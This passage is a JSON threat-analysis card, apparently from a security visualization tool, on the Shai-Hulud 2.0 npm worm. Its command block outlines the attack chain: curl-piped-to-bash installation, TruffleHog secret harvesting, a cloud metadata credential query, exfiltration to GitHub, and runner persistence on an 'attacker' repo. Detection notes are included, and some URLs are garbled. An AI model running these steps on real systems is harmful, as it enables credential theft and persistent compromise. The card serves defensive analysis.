{
    "title": "Shai-Hulud 2.0 NPM Supply Chain Worm",
    "description": "Self-propagating malware targeting npm packages that harvests cloud credentials, establishes persistence via GitHub Runners, and wipes systems upon failure.",
    "shortDescription": "Self-propagating npm worm harvesting cloud credentials",
    "tags": [
        "Supply_Chain",
        "NPM",
        "Credential_Dumping",
        "Worm",
        "CI_CD",
        "Persistence",
        "Cloud",
        "Exfiltration",
        "JavaScript"
    ],
    "version": "3.0",
    "viewport": {
        "zoom": 1.1,
        "pan": {
            "x": 150,
            "y": 50
        }
    },
    "metadata": {
        "descriptionHtml": "<p><strong>Shai-Hulud 2.0</strong> is a sophisticated, self-propagating worm that exploits the <span style='color:#ef4444;font-weight:bold;'>npm supply chain</span>. By compromising maintainer accounts, attackers publish trojanized packages containing a malicious <code>preinstall</code> script. This script covertly installs the <strong>Bun runtime</strong> to execute a complex payload that:</p><ol><li>Harvests secrets using <span style='color:#ef4444;font-weight:bold;'>TruffleHog</span> and cloud metadata queries.</li><li>Exfiltrates data to attacker-controlled GitHub repositories.</li><li>Establishes persistence by registering a self-hosted <strong>GitHub Actions Runner</strong>.</li><li>Propagates itself by trojanizing other packages owned by the victim.</li><li>Destroys system data (wiping <code>~</code>) if exfiltration fails.</li></ol>",
        "commandsBlock": "# Step 1: Malicious preinstall hook (setup_bun.js)\n$ curl -fsSL [https://bun.sh/install](https://bun.sh/install) | bash\n\n# Step 2: Secret Harvesting (bun_environment.js)\n$ pip install truffleHog\n$ trufflehog filesystem /home --max_depth 4\n$ curl [http://169.254.169.254/latest/meta-data/iam/security-credentials/](https://www.google.com/search?q=http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n\n# Step 3: Exfiltration to GitHub\n$ gh api --method POST /user/repos -f name="" -f description="Sha1-Hulud..."\n$ git push origin main\n\n# Step 4: Persistence (GitHub Runner)\n$ ./config.sh --url [https://github.com/attacker/repo](https://github.com/attacker/repo) --name SHA1HULUD --unattended\n$ nohup ./run.sh &",
        "extraInfo": [
            "Microsoft Security Blog - Shai-Hulud 2.0 Detection Guidance",
            "Datadog Security Labs - Analysis of the npm worm",
            "MITRE T1195.002 - Compromise Software Supply Chain",
            "MITRE T1552.005 - Cloud Instance Metadata API",
            "TruffleHog - [https://github.com/trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog)"
        ],
        "prerequisites": [
            "Target running 'npm install' on package with malicious hook",
            "Scripts enabled (npm_config_ignore_scripts=false)",
            "Outbound internet access to GitHub, npm, and bun.sh",
            "Stored credentials (~/.aws, ~/.npmrc, environment variables)"
        ],
        "attackerGains": [
            "Cloud credentials (AWS, GCP, Azure)",
            "NPM registry tokens for propagation",
            "GitHub Personal Access Tokens (PATs)",
            "Persistent command execution via GitHub Runner"
        ],
        "detectionNotes": [
            "Process execution of 'bun' or 'setup_bun.js' in npm folders",
            "Network traffic to 169.254.169.254 (IMDS) from non-cloud tools",
            "New GitHub repositories with 18-character random names",
            "Registration of self-hosted runners named 'SHA1HULUD'"
        ],
        "mitreCategories": [
            "T1195.002",
            "T1552.001",
            "T1567.001",
            "T1059.007",
            "T1584.006",
            "T1485"
        ]
    },
